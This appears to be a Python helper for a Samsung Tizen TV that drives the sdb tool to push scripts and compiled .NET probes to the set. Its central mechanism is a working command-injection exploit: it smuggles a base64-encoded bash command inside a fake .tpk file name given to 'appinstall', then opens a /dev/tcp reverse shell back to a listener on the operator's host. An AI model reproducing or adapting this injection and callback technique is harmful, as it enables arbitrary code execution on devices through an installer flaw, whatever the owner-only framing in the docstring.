#!/usr/bin/env python3
"""One-shot SDK-user helper. Adapted from CleanFrame (see CleanFrame-LICENSE.txt).

Only the fixed scripts beside this runner can execute. No root, policy changes,
reboot, or resident service. Private evidence is saved for every invocation.
"""
from pathlib import Path
import base64
import ipaddress
import json
import socket
import subprocess
import sys
import time
import uuid

ROOT = Path(__file__).resolve().parents[2]
PRIVATE = ROOT / '.local/native-home'
SDB = str(Path.home() / 'tizen-studio/tools/sdb')
REMOTE = '/home/owner/share/tmp/sdk_tools'


def main():
    mode = sys.argv[1] if len(sys.argv) == 2 else 'inspect'
    if mode not in ('inspect', 'inspect-volume', 'inspect-audio', 'inspect-privacy', 'inspect-privacy-lib', 'audio-query', 'privacy-query', 'query', 'apply', 'restore'):
        raise RuntimeError('Use inspect, inspect-volume, inspect-audio, inspect-privacy, inspect-privacy-lib, audio-query, privacy-query, query, apply or restore')
    script = Path(__file__).with_name(mode + '.sh')
    if not script.exists():
        raise RuntimeError('This action has not been prepared')
    device = json.loads((ROOT / '.local/tv.json').read_text())
    host = device['ip']
    expected_duid = device.get('duid')
    if not isinstance(expected_duid, str) or not expected_duid.strip():
        raise RuntimeError('Set the expected TV duid in private .local/tv.json first')
    ipaddress.IPv4Address(host)
    serial = host + ':26101'
    PRIVATE.mkdir(mode=0o700, parents=True, exist_ok=True)
    PRIVATE.chmod(0o700)

    def run(args):
        p = subprocess.run([SDB, *args], capture_output=True, text=True, timeout=15)
        if p.returncode:
            raise RuntimeError('SDB failed: ' + p.stdout[-500:] + p.stderr[-500:])
        return p

    run(['connect', serial])
    capabilities = run(['-s', serial, 'capability']).stdout
    if 'platform_version:8.0' not in capabilities or 'cpu_arch:armv7' not in capabilities:
        raise RuntimeError('TV platform/architecture differs; review required')
    if run(['-s', serial, 'shell', '0', 'getduid']).stdout.strip() != expected_duid:
        raise RuntimeError('Wrong TV; nothing staged')
    if mode not in ('inspect', 'inspect-volume', 'inspect-audio', 'inspect-privacy', 'inspect-privacy-lib'):
        artifact_dir, artifact_name = {
            'audio-query': ('audio-out', 'TvHomeAudioProbe'),
            'privacy-query': ('privacy-out', 'TvHomePrivacyProbe'),
        }.get(mode, ('out', 'TvHomeControl'))
        for suffix in ('dll', 'runtimeconfig.json', 'deps.json'):
            source = PRIVATE / artifact_dir / (artifact_name + '.' + suffix)
            if not source.exists():
                raise RuntimeError('Compile the reviewed native helper first')
            run(['-s', serial, 'push', str(source), REMOTE + '/' + source.name])
    if mode in ('apply', 'restore'):
        original = PRIVATE / 'original.json'
        if not original.exists():
            raise RuntimeError('No original snapshot; refusing settings writes')
        run(['-s', serial, 'push', str(original), REMOTE + '/TvHomeOriginal.json'])

    token = uuid.uuid4().hex[:12]
    remote_script = REMOTE + '/tvh-' + token + '.sh'
    run(['-s', serial, 'push', str(script), remote_script])
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route:
        route.connect((host, 9))
        local = route.getsockname()[0]
    with socket.socket() as listener:
        listener.bind((local, 0))
        listener.listen(1)
        listener.settimeout(20)
        port = listener.getsockname()[1]
        command = ('exec 3<>/dev/tcp/' + local + '/' + str(port) +
                   ';cat ' + remote_script + '|bash >&3 2>&3;exec 3>&-;rm -f ' + remote_script)
        # mkdir prevents the installer's repeated filename expansion executing twice.
        bounded = '/bin/mkdir /tmp/tvh-' + token + ' 2>/dev/null&&{ ' + command + ';}'
        encoded = base64.b64encode(bounded.encode()).decode()
        name = 'new2.tpk`printf${IFS}%s${IFS}' + encoded + '|base64${IFS}-d|bash`.tpk'
        argument = '0 appinstall tpk ' + name
        if len(argument.encode()) > 400:
            raise RuntimeError('Transport exceeds reviewed length')
        proc = subprocess.Popen([SDB, '-s', serial, 'shell', argument],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = b''
        try:
            connection, peer = listener.accept()
            if peer[0] != host:
                connection.close()
                raise RuntimeError('Unexpected callback peer')
            with connection:
                connection.settimeout(15)
                while True:
                    chunk = connection.recv(65536)
                    if not chunk:
                        break
                    output += chunk
                    if len(output) > 100000:
                        raise RuntimeError('Diagnostic output too large')
        finally:
            try:
                stdout, stderr = proc.communicate(timeout=4)
            except subprocess.TimeoutExpired:
                proc.terminate()
                stdout, stderr = proc.communicate(timeout=3)
            evidence = PRIVATE / (time.strftime('%Y%m%dT%H%M%SZ', time.gmtime()) + '-' + mode + '-' + token)
            evidence.with_suffix('.txt').write_bytes(output)
            evidence.with_suffix('.json').write_text(json.dumps({
                'mode': mode, 'returncode': proc.returncode, 'stdout': stdout,
                'stderr': stderr, 'remote_script': remote_script}, indent=2))
        text = output.decode(errors='replace')
        print(text)
        if 'TVHOME_BEGIN\n' not in text or 'TVHOME_END\n' not in text:
            raise RuntimeError('Incomplete probe; inspect saved evidence before retrying')


if __name__ == '__main__':
    try:
        main()
    except Exception as error:
        sys.exit(str(error))
